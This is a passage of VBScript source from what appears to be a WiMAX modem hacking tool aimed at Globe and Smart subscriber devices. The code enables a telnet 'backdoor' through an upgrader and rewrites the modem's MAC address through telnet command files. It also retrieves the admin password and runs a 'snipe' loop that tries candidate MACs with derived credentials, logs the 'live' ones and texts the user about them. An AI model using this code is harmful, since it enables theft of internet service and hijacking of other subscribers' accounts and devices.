IsSecurityBtnExist = False
WaitIEtoLoad(IE)
IsSecurityBtnExist = TestObjectSecurityBtn(IE)
If IsSecurityBtnExist Then
DisplayLogMacGenScan "Accessing Security page... Ok!"
Sleeper 2000
Exit Do
Else
If checkCountSecurityBtn = 3 Or checkCountSecurityBtn = 10 Or checkCountSecurityBtn = 15 Then
DisplayLogMacGenScan "Waiting for Security page to load...."
IE.Refresh
ElseIf checkCountSecurityBtn = 20 Then
DisplayLogMacGenScan "Sorry failed to ACCESS Security page on " & inputTelnetHost.value &"...."
createTxtLogError LogContents.value  
IE.Quit
Sleeper 1000
ChangeSecurityOnlySnipe = 0
Exit Function
End If
End If
Sleeper 2000
Loop While IsSecurityBtnExist = False
IsSecurityBtnExist = False
checkCountSecurityBtn = 0

''chkEnableTLSSnipe.Disabled = True
''chkAllowNaiSnipe.Disabled = True

''If Not chkEnableTLSSnipe.Checked Then
If isTTLS Then
''
IsTTLSExist = False
checkCountTTLS = 0
Do
checkCountTTLS = checkCountTTLS + 1
IsTTLSExist = False
WaitIEtoLoad(IE)
IsTTLSExist = TestObjectTTLS(IE)
If IsTTLSExist Then
DisplayLogMacGenScan "Authentication type is TTLS..."
Sleeper 2000
Exit Do
Else
If checkCountTTLS = 3 Or checkCountTTLS = 10 Or checkCountTTLS = 15 Then
DisplayLogMacGenScan "Waiting for TLLS to be set...."
IE.Refresh
ElseIf checkCountTTLS = 20 Then
DisplayLogMacGenScan "Sorry failed to set TTLS on " & inputTelnetHost.value &"...."
createTxtLogError LogContents.value  
IE.Quit
Sleeper 1000
ChangeSecurityOnlySnipe = 0
Exit Function
End If
End If
Sleeper 2000
Loop While IsTTLSExist = False
IsTTLSExist = False
checkCountTTLS = 0
''
Else

IsTLSExist = False
checkCountTLS = 0
Do
checkCountTLS = checkCountTLS + 1
IsTLSExist = False
WaitIEtoLoad(IE)
IsTLSExist = TestObjectTLS(IE)
If IsTLSExist Then
DisplayLogMacGenScan "Authentication type is TLS..."
Sleeper 2000
Exit Do
Else
If checkCountTLS = 3 Or checkCountTLS = 10 Or checkCountTLS = 15 Then
DisplayLogMacGenScan "Waiting for TLS to be set...."
IE.Refresh
ElseIf checkCountTLS = 20 Then
DisplayLogMacGenScan "Sorry failed to set TLS on " & inputTelnetHost.value &"...."
createTxtLogError LogContents.value  
IE.Quit
Sleeper 1000
ChangeSecurityOnlySnipe = 0
Exit Function
End If
End If
Sleeper 2000
Loop While IsTLSExist = False
IsTLSExist = False
checkCountTLS = 0
End If
'MsgBox "Success"
'Exit Sub
Sleeper 3000
If chkAllowNaiSnipe.Checked Then
'Msgbox "NAI changes is ALLOWED."
''DisplayLogMacGenScan(macNai & macDomain)
Set setNAI = IE.document.getElementByID("contentfrm").contentWindow.document.All("Anony_Item")
setNAI.Value = macNai & macDomain 'inputNai.value & drpDwnNaiDomain.value 
''	DisplayLogMacGenScan("Filling up NAI as" & setNAI.Value)
End If	
Sleeper 3000 	
''	DisplayLogMacGenScan("pass and domain: "& macPassword & macDomain)
Set setUserId = IE.document.getElementByID("contentfrm").contentWindow.document.All("User_Id")
''setUserId.Value = macPassword & macDomain  'inputUserId.value & drpDwnUserIdDomain.value
If chkAdvancePass.Checked Then
''xpass begin
If patternPassDropdwnList.value = "gemtek" Then
setUserId.Value = macNai & macDomain
Else
setUserId.Value = advancePassUidAndPass & myCurrenMaclastHex & macDomain  
End If
''xpass end
Else
setUserId.Value = macPassword & macDomain  
End If
''	DisplayLogMacGenScan("Filing up UserId as: " & setUserId.Value) 
Sleeper 3000
''content - Microsoft Internet Explorer
''DisplayLogMacGenScan("pass: "& macPassword)
Set setUserPasswd = IE.document.getElementByID("contentfrm").contentWindow.document.All("User_Password")
''setUserPasswd.Value = macPassword  'inputDomainPassword.value 
If chkAdvancePass.Checked Then
''xpass begin
If patternPassDropdwnList.value = "gemtek" Then
setUserPasswd.Value = macNai
Else
setUserPasswd.Value = advancePassUidAndPass & myCurrenMaclastHex
End If
''xpass end
Else
setUserPasswd.Value = macPassword 
End If
''	DisplayLogMacGenScan("Filling up Password as: " & setUserPasswd.Value & vbCr & vbLf & "NOTE: Press OK button on window POPUP if NOT working for long period of time....")
'IE.Stop
Sleeper 3000
''
'If chkEnableTLSSnipe.Checked Then
''Msgbox "NAI changes is ALLOWED."
'Set setTLS = IE.document.getElementByID("contentfrm").contentWindow.document.All("List_Auth")
'setTLS.selectedIndex = 0
'setTLS.onchange
'DisplayLogMacGenScan("Changing setting.... ")
'Sleeper 3000
'End If
''
''chkAllowNaiSnipe.Disabled = False
''chkEnableTLSSnipe.Disabled = False
Set setBtnApply = IE.document.getElementByID("contentfrm").contentWindow.document.All("btnApply")
'' set to FALSE so that the caller will not wait to finish processing press0k.vbs
''CreateObject("WScript.Shell").Run "pressOk.vbs ",0 , False
'filename = "pressOk.vbs"
'textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
'CreateObject("WScript.Shell").Run textFilePath,0 , False 
filename = "pressOk.vbs"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34),0 , False
''
Sleeper 1000					
setBtnApply.click
Sleeper 1000
DisplayLogMacGenScan("Applying Changes....")
Sleeper 7000
IE.Stop
If Err.Number = 0 Then
'Sleeper 5000
'IE.Stop
IE.quit
DisplayLogMacGenScan("Closing IE...." )
Set IE = Nothing
Sleeper 2000
If radiobtnBm6222011.checked Then
DisplayLogMacGenScan("Change settings finish....")
Else
DisplayLogMacGenScan("Change settings finish...." & vbCr & vbLf & "Web ADMIN pass:" & macPasswordAdmin)
End If 
''begin if stop by user
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
DisplayLogMacGenScan("Stopping process....Ok!")
hdnStopProcessResult.value = "1"
Exit Function
End If
''end if stop
''ping google.com test if connected
''liveCount = 0
macIsLive = "Dead"
'telnetHostLive = False
'hostToPing = "127.0.0.1"
'hostToPing = "192.168.22.1"
''hostToPing = "www.google.com"
DisplayLogMacGenScan("Testing internet connection....")
DisplayLogMacGenScan("PLEASE WAIT while the TESTING is not finish.... Number of tries is: " & snipeTryList.value)
DisplayLogMacGenScan("DO NOT CLOSE the TOOL in this process. Use STOP to cancel process!!!")
Sleeper 10000
''
''begin check internet
''If (liveCount > 0) Then
If CheckInternetSnipe Then
'' end check internet
''appendLiveMacToFile macToTestValue,macDomainValue
appendLiveMacToFile macToTest,macDomainOrig
Sleeper 2000
macIsLive = "Alive"
''liveMacFound = liveMacFound + 1
'ChangeSecurityOnlySnipe = 1
''liveCount = 0
'telnetHostLive = False
If chkEnableSmsSnipe.Checked Then
DisplayLogMacGenScan "SMS/Text Notifier is enabled. Trying to send info.Please Wait......"
msgToSend = Mid(macToTest,1,8) & " series is ALIVE!!" 
numberTosend = Trim(inputPhone.value)
numberPrefix = liveIPTryList.value
If  numberTosend  <> "1234567" Then
If SendTextSMS(numberPrefix,numberTosend,msgToSend) Then
DisplayLogMacGenScan "Live MAC found SENT.... to " &numberPrefix & numberTosend
Else 
DisplayLogMacGenScan "Failed to Send SMS/text... to " &numberPrefix & numberTosend
End If
Else 
DisplayLogMacGenScan "You did not specifiy the phone number..."
End If
End If 
changeResult = 1
End If
''macToTest,macDomain
DisplayLogMacGenScan(macToTest & " is " & macIsLive & "!!!...." )
Sleeper 1000
'	Exit Sub
''Set macToTestValue = Nothing
''Set macDomainValue = Nothing
checkTryCount = 0
deadCountHost = 0
liveCount = 0
Else
'Sleeper 5000
'IE.Stop
IE.quit
DisplayLogMacGenScan("Closing IE...." )
Set IE = Nothing
''Set macToTestValue = Nothing
''Set macDomainValue = Nothing
'telnetHostLive = False
DisplayLogMacGenScan("Security Setting change FAILED!!!...." & vbCr & vbLf & "Check your MAC,Security Fields, Device and etc....."  )
DisplayLogMacGenScan("Error #: " & Err.Number & " Source: " & Err.Source & " Desc: " &  Err.Description)
Err.Clear
DisplayLogMacGenScan("Maybe the page takes time to load... And also check your DEVICE CURRENT MAC.") 
DisplayLogMacGenScan("Process aborted.... Please try again")
DisplayLogMacGenScan "Tool Version: " & VersionAboutTool
'ChangeSecurityOnlySnipe = 0
changeResult = 0
createTxtLogError LogContents.value 
hdnStopProcessResult.value = "1"
' Exit Function
End If 
Else
DisplayLogMacGenScan("Process aborted.... Please check your CONNECTION if your connected to WIMAX device.")
DisplayLogMacGenScan "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device."
DisplayLogMacGenScan "Tool Version: " & VersionAboutTool
createTxtLogError LogContents.value
hdnStopProcessResult.value = "1"
MsgBox "WIMAX device is unreachable... process aborted. Please check your connection.",16,"Connection Status"
End If
'MsgBox "Exiting change security"
ChangeSecurityOnlySnipe = changeResult 
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
DisplayLogMacGenScan "Tool Version: " & VersionAboutTool
createTxtLogError LogContents.value
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit Function
End If
End Function
Sub Testing
'	inputMacToUse = "00:25:9C:F2:95:93"
'	tstInputCmndFile = "TelnetInputCmnd.txt"
'	tstCmnd622i2010 currentMac,tstInputCmndFile
'	Sleeper 1000
'	ConnectToTST
MsgBox "Failed To Connect: is OK??  = " & CheckTstLogFile("TelnetOutPutCmnd_2.txt")
MsgBox "Incorrect Login: is OK??  = " & CheckTstLogFile("TelnetOutPutCmnd.txt")
MsgBox "Failed To change MAC: is OK??  = "  & CheckTstLogFile("FailedCmnd.txt")
MsgBox "Success change MAC: is OK??  = " & CheckTstLogFile("successCmnd.txt")
End Sub
Sub RestoreDefaultMac
''drpDwnDefaultMacDomain.selectedIndex = 3
''setTLS.onchange
If chkEnableTLSDef.Checked = True Then
chkEnableTLS.Checked = True
document.all.chkEnableTLSLabel.style.background = "Red"
Else
chkEnableTLS.Checked = False
document.all.chkEnableTLSLabel.style.background = ""
End If 
If chkAllowNaiDef.Checked = True Then
chkAllowNai.Checked = True
document.all.chkAllowNaiLabel.style.background = "Red"
Else
chkAllowNai.Checked = False
document.all.chkAllowNaiLabel.style.background = ""
End If 
inputChangeMacOne.value = inputDefaultMAC.value
GetPassAndDomainPass
macDomainItem = drpDwnDefaultMacDomain.value
''NAidomain"
set objSelect = document.getElementById("drpDwnNaiDomain")
for i = 0 to objSelect.length ''for i = 0 to objSelect.length - 2
'msgbox objSelect.options(i).value
If objSelect.options(i).value = macDomainItem   Then
drpDwnNaiDomain.selectedIndex = i
Exit for
End if
Next

''UserIddomain"
set objSelectIdDomain = document.getElementById("drpDwnUserIdDomain")
for i = 0 to objSelectIdDomain.length ''for i = 0 to objSelect.length - 2
'msgbox objSelect.options(i).value
If objSelectIdDomain.options(i).value = macDomainItem   Then
drpDwnUserIdDomain.selectedIndex = i
Exit for
End if
Next
inputUserId.value = inputDefaultMACPassword.value
inputDomainPassword.value = inputDefaultMACPassword.value
selPanel(1)
If chkEnableRestore.Checked Then
radioBtnReboot.Checked = False
radioBtnRestore.Checked = True
radioBtnRestore.Click
ChangeMacTestOnly
Else
radioBtnRestore.Checked = False
radioBtnReboot.Checked = True
radioBtnReboot.Click
ChangeMacTestOnly
End If

End Sub
''
''
Sub SetDefaultDomainSmartGlobe
macDomainItem = "@globelines.com.ph"
If radiobtnDv235tS.checked Then
macDomainItem = "@smartbro.net"
End If 
set objSelect = document.getElementById("drpDwnNaiDomain")
for i = 0 to objSelect.length ''for i = 0 to objSelect.length - 2
'msgbox objSelect.options(i).value
If objSelect.options(i).value = macDomainItem   Then
drpDwnNaiDomain.selectedIndex = i
Exit for
End if
Next
''
''UserIddomain"
set objSelectIdDomain = document.getElementById("drpDwnUserIdDomain")
for i = 0 to objSelectIdDomain.length ''for i = 0 to objSelect.length - 2
'msgbox objSelect.options(i).value
If objSelectIdDomain.options(i).value = macDomainItem   Then
drpDwnUserIdDomain.selectedIndex = i
Exit for
End if
Next
''
''UserIddomainSnipe"
macDomainItem = macDomainItem &",TTLS"
set objSelectIdDomain = document.getElementById("snipeDomainDropdwnList")
for i = 0 to objSelectIdDomain.length ''for i = 0 to objSelect.length - 2
'msgbox objSelect.options(i).value
If objSelectIdDomain.options(i).value = macDomainItem   Then
snipeDomainDropdwnList.selectedIndex = i
Exit for
End if
Next
''
End Sub
''
''BEGIN ConnectToTST Final MAC 622i 2011
Sub ConnectToTST622i2011FinalMac
currentMac = Trim(inputChangeMacOne.value)
stableMacFusion = Trim(inputChangeMacOneStable.value)
''tstInputCmndFile = "TelnetInputCmnd.txt"
filenameInput =  "TelnetInputCmnd.txt"
tstInputCmndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameInput)
''
DisplayLogChangeMAConly("Preparing to process command...")
If ChangingMacButtonOption = "REBOOT" Then
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Change MAC using REBOOT method "
TextAreaScrollBottom(changeMACLog.name)

If radiobtnBm622i2011.checked Then
''MsgBox " Using 622i2011 restoreMaconly"
DisplayLogChangeMAConly("Executing UPGRADER to ENABLE telnet BACKDOOR (Final working MAC).....")
DisplayLogChangeMAConly("DO NOT CLOSE THE UPGRADER!!!! (AUTO CLOSE ENABLED).....")
Sleeper 1000
''MsgBox " Using 622i2011 restoreMaconly"
RunUpdater22i2011
Sleeper 1000
TstCmnd622i2011Reboot currentMac,tstInputCmndFile ''REBOOT

Else
MsgBox "Your Device is not on the list."
Exit Sub
End If
End If	
''tstLogCmnd =  "TelnetOutPutCmnd.txt"
filenameOutPut =  "TelnetOutPutCmnd.txt"
tstLogCmnd = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameOutPut)
''
Sleeper 1000
'tstCmnd macAddress,tstInputCommand
''tsCmnd = "/r:" & tstInputCmndFile & " /o:" & tstLogCmnd & " /m"
tsCmnd = "/r:" & Chr(34)& tstInputCmndFile & chr(34) & " /o:" & Chr(34)& tstLogCmnd & chr(34) & " /m"
Sleeper 1000
'tstRunShell = objShellInGen.run ("tst10.exe " & tsCmnd ,0 , 1)
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Trying to change MAC address..."
''CreateObject("WScript.Shell").Run "tst10.exe " & tsCmnd ,0 , 1
filename = "tst10.exe"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)	
''
'filenameExitTst = "exitTst10.vbs"
'currentFolderAndFileExitTst = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameExitTst)
'CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFileExitTst & chr(34),0 , False
ExecuteDLL "wscript","exitTst10.vbs","closeTST"
''
CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34) &" " &tsCmnd,0 , True	
''
End Sub
''END ConnectToTST Final MAC 622i 2011 
''
''
''
''BEGIN ConnectToTST GetPass 622 2011
Sub ConnectToTST6222011GetPass(displayLogNum)
'currentMac = Trim(inputChangeMacOne.value)
'stableMacFusion = Trim(inputChangeMacOneStable.value)
''tstInputCmndFile = "TelnetInputCmnd.txt"
filenameInput =  "TelnetInputCmndGetPass.txt"
tstInputCmndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameInput)
''
''DisplayLog(viewloglocation,logString)
''DisplayLog displayLogNum, "Preparing to process command..."
'If ChangingMacButtonOption = "REBOOT" Then
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Change MAC using REBOOT method "
'TextAreaScrollBottom(changeMACLog.name)

If radiobtnBm6222011.checked Then
''MsgBox " Using 622i2011 restoreMaconly"
DisplayLog displayLogNum, "Preparing to get Admin Password....." 
Sleeper 1000
TstCmnd6222011GetPassWord tstInputCmndFile ''REBOOT

Else
MsgBox "Your Device is not on the list."
Exit Sub
End If
'End If	
''tstLogCmnd =  "TelnetOutPutCmnd.txt"
filenameOutPut =  "TelnetOutPutCmndGetPass.txt"
tstLogCmnd = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameOutPut)
''
Sleeper 1000
'tstCmnd macAddress,tstInputCommand
''tsCmnd = "/r:" & tstInputCmndFile & " /o:" & tstLogCmnd & " /m"
tsCmnd = "/r:" & Chr(34)& tstInputCmndFile & chr(34) & " /o:" & Chr(34)& tstLogCmnd & chr(34) & " /m"
Sleeper 1000
'tstRunShell = objShellInGen.run ("tst10.exe " & tsCmnd ,0 , 1)
DisplayLog displayLogNum, "Trying to Get Admin Password..."
''CreateObject("WScript.Shell").Run "tst10.exe " & tsCmnd ,0 , 1
filename = "tst10.exe"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)	
''
'filenameExitTst = "exitTst10.vbs"
'currentFolderAndFileExitTst = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameExitTst)
'CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFileExitTst & chr(34),0 , False
ExecuteDLL "wscript","exitTst10.vbs","closeTST"
''
CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34) &" " &tsCmnd,0 , True	
''
End Sub
''END ConnectToTST GetPass 622 2011 
''
''
Sub ConnectToTST
currentMac = Trim(inputChangeMacOne.value)
stableMacFusion = Trim(inputChangeMacOneStable.value)
''tstInputCmndFile = "TelnetInputCmnd.txt"
filenameInput =  "TelnetInputCmnd.txt"
tstInputCmndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameInput)
''
DisplayLogChangeMAConly("Preparing to process command...")
If ChangingMacButtonOption = "REBOOT" Then
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Change MAC using REBOOT method"
TextAreaScrollBottom(changeMACLog.name)
If radiobtnBm622i.checked Then
''MsgBox " Using 622i rebootMaconly"
TstCmnd622i2010Reboot currentMac,tstInputCmndFile
ElseIf radiobtnBm622i2011.checked Then
''MsgBox " Using 622i2011 restoreMaconly"
DisplayLogChangeMAConly("Executing UPGRADER to ENABLE telnet BACKDOOR (Master MAC and SERIAL).....")
DisplayLogChangeMAConly("DO NOT CLOSE THE UPGRADER!!!! (AUTO CLOSE ENABLED).....")
Sleeper 1000
''MsgBox " Using 622i2011 restoreMaconly"
RunUpdater22i2011
Sleeper 1000
TstCmnd622i2011MasterMacReboot tstInputCmndFile ''MASTER SERIAL and MAC TEST
ElseIf radiobtnBm622m2012.checked Then
''MsgBox " Using 622m2012 rebootMaconly"
TstCmnd622m2012RebootRestore currentMac,tstInputCmndFile
ElseIf  radiobtnBm622.checked Then
''MsgBox " Using 622 rebootMaconly"
TstCmnd622Reboot currentMac,tstInputCmndFile
ElseIf  radiobtnBm6222011.checked Then
''MsgBox " Using 622 2011 rebootMaconly"
TstCmnd6222011Reboot currentMac,tstInputCmndFile
ElseIf  radiobtnBm621.checked Then
''MsgBox " Using 621 rebootMaconly"
TstCmnd621Reboot currentMac,tstInputCmndFile
ElseIf  radiobtnDv235tG.checked Then
''MsgBox " Using 235t rebootMaconly"
TstCmndDv235tGlobeReboot currentMac,tstInputCmndFile
''Exit Sub ''delete this
ElseIf  radiobtnDv235tS.checked Then
''MsgBox " Using 235t rebootMaconly"
TstCmndDv235tSmartReboot currentMac,tstInputCmndFile
''Exit Sub ''delete this
Else
MsgBox "REBOOT METHOD is not yet supported on your device.....(Try RESTORE METHOD)", 64+4096 , "ERROR NOT SUPPORTED!!!...."
Exit Sub
End If
Else
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Change MAC using RESTORE method"
TextAreaScrollBottom(changeMACLog.name)
If radiobtnBm622i.checked Then
''MsgBox " Using 622i restoreMaconly"
TstCmnd622i2010Restore currentMac,tstInputCmndFile
ElseIf radiobtnBm622i2011.checked Then
''MsgBox " Using 622i2011 restoreMaconly"
DisplayLogChangeMAConly("Executing UPGRADER to ENABLE telnet BACKDOOR (RESTORE method).....")
DisplayLogChangeMAConly("DO NOT CLOSE THE UPGRADER!!!! (AUTO CLOSE ENABLED).....")
Sleeper 1000
''MsgBox " Using 622i2011 restoreMaconly"
RunUpdater22i2011
Sleeper 1000
TstCmnd622i2011Restore currentMac,tstInputCmndFile ''REBSTORE
''TstCmnd622i2011MasterMacReboot tstInputCmndFile ''MASTER SERIAL and MAC TEST
''TstCmnd622i2011Reboot currentMac,tstInputCmndFile ''REBOOT
ElseIf radiobtnBm622m2012.checked Then
''MsgBox " Using 622m2012 restoreMaconly"
TstCmnd622m2012RebootRestore currentMac,tstInputCmndFile
ElseIf  radiobtnBm622.checked And Not chkBxStableMAC.checked Then
''MsgBox " Using 622 restoreMaconly"
TstCmnd622Restore currentMac,tstInputCmndFile
ElseIf radiobtnBm622.checked And chkBxStableMAC.checked Then
''MsgBox " Using 622 restoreMaconly FUSION"
TstCmnd622RestoreFusion currentMac,stableMacFusion,tstInputCmndFile
ElseIf  radiobtnBm621.checked And Not chkBxStableMAC.checked Then
''MsgBox " Using 621 restoreMaconly"
TstCmnd621Restore currentMac,tstInputCmndFile
Else
MsgBox "RESTORE METHOD is not yet supported on your device.....(Try REBOOT METHOD)" , 64+4096 , "ERROR NOT SUPPORTED!!!...."
Exit Sub
End If
End If	
''tstLogCmnd =  "TelnetOutPutCmnd.txt"
filenameOutPut =  "TelnetOutPutCmnd.txt"
tstLogCmnd = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameOutPut)
''
Sleeper 1000
'tstCmnd macAddress,tstInputCommand
tsCmnd = "/r:" & Chr(34)& tstInputCmndFile & chr(34) & " /o:" & Chr(34)& tstLogCmnd & chr(34) & " /m"
Sleeper 1000
'tstRunShell = objShellInGen.run ("tst10.exe " & tsCmnd ,0 , 1)
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Trying to change MAC address..."
''CreateObject("WScript.Shell").Run "tst10.exe " & tsCmnd ,0 , 1 ''working tst
filename = "tst10.exe"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)	
''
'filenameExitTst = "exitTst10.vbs"
'currentFolderAndFileExitTst = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameExitTst)
'CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFileExitTst & chr(34),0 , False
ExecuteDLL "wscript","exitTst10.vbs","closeTST"
''
CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34) &" " &tsCmnd,0 , True	
''
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Finish and rebooting device...."
'MsgBox "Device is rebooting... Please wait!",48+4096,"Notification"
End Sub
Sub ConnectToTSTSnipe(macToTestString)
''currentMacSnipe = Trim(inputChangeMacOne.value)
currentMacSnipe = Trim(macToTestString)
''tstInputCmndFile = "TelnetInputCmnd.txt"
filenameInput =  "TelnetInputCmnd.txt"
tstInputCmndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameInput)
Sleeper 1000
''
DisplayLogMacGenScan("Preparing to process command...")
If SnipeMacRadioOption = "REBOOT" Then
DisplayLogMacGenScan("Change using REBOOT method")
''				changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Change using Reboot method"
''				TextAreaScrollBottom(changeMACLog.name)
If radiobtnBm622i.checked Then
'MsgBox " Using 622i rebootsnipe"
TstCmnd622i2010RebootSnipe currentMacSnipe,tstInputCmndFile
ElseIf  radiobtnBm622.checked Then
'MsgBox " Using 622 rebootsnipe"
TstCmnd622RebootSnipe currentMacSnipe,tstInputCmndFile
ElseIf  radiobtnBm622m2012.checked Then
''MsgBox " Using 622m2012 rebootsnipe"
TstCmnd622m2012RebootRestoreSnipe currentMacSnipe,tstInputCmndFile
ElseIf  radiobtnBm6222011.checked Then
'MsgBox " Using 622 2011 rebootsnipe"
TstCmnd6222011RebootSnipe currentMacSnipe,tstInputCmndFile
ElseIf  radiobtnBm621.checked Then
'MsgBox " Using 621 rebootsnipe"
TstCmnd621RebootSnipe currentMacSnipe,tstInputCmndFile
ElseIf  radiobtnDv235tG.checked Then
''MsgBox " Using 235t rebootMaconly"
TstCmndDv235tSnipeCheckTelnet currentMacSnipe,tstInputCmndFile
''Exit Sub ''delete this
ElseIf  radiobtnDv235tS.checked Then
''MsgBox " Using 235t rebootMaconly"
TstCmndDv235tSnipeCheckTelnet currentMacSnipe,tstInputCmndFile
Else
MsgBox "REBOOT METHOD is not yet supported on your device.....(Try RESTORE METHOD)", 64+4096 , "ERROR NOT SUPPORTED!!!...."
Exit Sub
End If
''begin if stop by user
If hdnStopMacProcess.value = "1" Then
Sleeper(1000)
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit Sub
End If
''end if stop
Else
DisplayLogMacGenScan("Change using RESTORE method")
''				changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Change using RESTORE method"
''				TextAreaScrollBottom(changeMACLog.name)
If radiobtnBm622i.checked Then
'MsgBox " Using 622i restore"
TstCmnd622i2010RestoreSnipe currentMacSnipe,tstInputCmndFile
ElseIf radiobtnBm622i2011.checked Then
''MsgBox " Using 622i2011 restoreMaconly"
DisplayLogMacGenScan("Executing UPGRADER to ENABLE telnet BACKDOOR (RESTORE method).....")
DisplayLogMacGenScan("DO NOT CLOSE THE UPGRADER!!!! (AUTO CLOSE ENABLED).....")
Sleeper 1000
''MsgBox " Using 622i2011 restoreMaconly"
RunUpdater22i2011
Sleeper 1000
TstCmnd622i2011Restore currentMacSnipe,tstInputCmndFile ''REBSTORE
''TstCmnd622i2011MasterMacReboot tstInputCmndFile ''MASTER SERIAL and MAC TEST
''TstCmnd622i2011Reboot currentMac,tstInputCmndFile ''REBOOT
ElseIf radiobtnBm622m2012.checked Then
'MsgBox " Using 622m2012 RestoreMacSnipe"
TstCmnd622m2012RebootRestoreSnipe currentMacSnipe,tstInputCmndFile
ElseIf  radiobtnBm622.checked Then
'MsgBox " Using 622 restoredef"
TstCmnd622RestoreSnipe currentMacSnipe,tstInputCmndFile
ElseIf  radiobtnBm621.checked Then
'MsgBox " Using 622 restoredef"
TstCmnd621RestoreSnipe currentMacSnipe,tstInputCmndFile
Else
MsgBox "RESTORE METHOD is not yet supported on your device.....(Try REBOOT METHOD)", 64+4096 , "ERROR NOT SUPPORTED!!!...."
Exit Sub
End If
''begin if stop by user
If hdnStopMacProcess.value = "1" Then
Sleeper(1000)
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit Sub
End If
''end if stop	
End If	
''tstLogCmnd =  "TelnetOutPutCmnd.txt"
filenameOutPut =  "TelnetOutPutCmnd.txt"
tstLogCmnd = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameOutPut)
''
Sleeper 1000
''tstCmnd macAddress,tstInputCommand
''tsCmnd = "/r:" & tstInputCmndFile & " /o:" & tstLogCmnd & " /m"
tsCmnd = "/r:" & Chr(34)& tstInputCmndFile & chr(34) & " /o:" & Chr(34)& tstLogCmnd & chr(34) & " /m"
''
Sleeper 1000
''tstRunShell = objShellInGen.run ("tst10.exe " & tsCmnd ,0 , 1)
''changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Trying to change MAC address..."
If radiobtnDv235tG.checked Or radiobtnDv235tS.checked Then
DisplayLogMacGenScan("DV235t: Testing telnet ADMIN access...")
Else
DisplayLogMacGenScan("Trying to change MAC address...")
End If
''begin if stop by user
If hdnStopMacProcess.value = "1" Then
Sleeper(1000)
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit Sub
End If
''end if stop
'CreateObject("WScript.Shell").Run "tst10.exe " & tsCmnd ,0 , 1 ''working TST
filename = "tst10.exe"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)	
''
'filenameExitTst = "exitTst10.vbs"
'currentFolderAndFileExitTst = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameExitTst)
'CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFileExitTst & chr(34),0 , False
ExecuteDLL "wscript","exitTst10.vbs","closeTST"
''
CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34) &" " &tsCmnd,0 , True	
''
''changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Finish and rebooting device...."
''MsgBox "Device is rebooting... Please wait!",48+4096,"Notification"
End Sub
Function CheckTstLogFile (tstLogCmndFileText)		
Dim fso, logFileTstCmnd, sIncorrectString, sSuccessString, sReadAll
filenameLogFile = tstLogCmndFileText
tstLogCmndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameLogFile)
Set fso = CreateObject("Scripting.FileSystemObject")
isOk = False
If fso.FileExists(tstLogCmndFile)= True Then
If fso.GetFile(tstLogCmndFile).size <> 0 then
' open the file and process it
'MsgBox "File is NOT empty"
Const ForReading = 1
Set logFileTstCmnd = fso.OpenTextFile(tstLogCmndFile, ForReading)
sIncorrectString = "incorrect."
sSuccessString = "success."
If radiobtnDv235tG.checked Or radiobtnDv235tS.checked Then
sIncorrectString = "please enter"
sSuccessString = "MT7109#"
End If
If radiobtnBm622m2012.checked Then
sIncorrectString = "please enter"
sSuccessString = "#"
End If
sReadAll = logFileTstCmnd.ReadAll
logFileTstCmnd.Close
If InStr(1,sReadAll, sIncorrectString,1) > 0 Then
'MsgBox "Incorrect login"
isOk = False
Else
'MsgBox "Login correct"' CheckTstLogFile = False
'
If InStr(sReadAll, sSuccessString) > 0 Then
'MsgBox "Success change MAC"
isOk = True
Else
'MsgBox "Failed change mac"' CheckTstLogFile = False
isOk = False
End If
'
End If
Else
'MsgBox "File is EMPTY!"
isOk = False
End if
Else
'MsgBox "File NOT EXIST"
isOk = False
End If
''PopulateTelnetAccount	
''If radiobtnBm622m2012.checked Then
''isOk = True
''End If
''If radiobtnDv235tG.checked Or radiobtnDv235tS.checked Then
''isOk = True
''End if
CheckTstLogFile = isOk
Set fso = Nothing
Set logFileTstCmnd = Nothing 
Set sIncorrectString = Nothing 
